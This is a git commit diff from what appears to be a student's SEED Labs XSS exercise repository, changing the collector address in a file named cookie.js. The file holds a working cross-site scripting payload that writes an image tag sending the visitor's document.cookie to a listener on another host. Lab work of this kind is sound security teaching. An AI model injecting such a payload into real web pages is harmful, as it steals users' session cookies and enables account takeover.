3aed35d0bf7656937700e1ac9eeb9a82de97a6e6
gnuttt <gt93cc@gmail.com>
2018-06-09 22:56:42 +0800

    cookie.js

--- mySeedLab/XSS/cookie.js
+++ mySeedLab/XSS/cookie.js
@@ -1,3 +1,3 @@
 <script>
-		document.write("<img src='http://192.168.59.146:5555?c=" + escape(document.cookie) + "'>")
+		document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cookie) + "'>")
 </script>
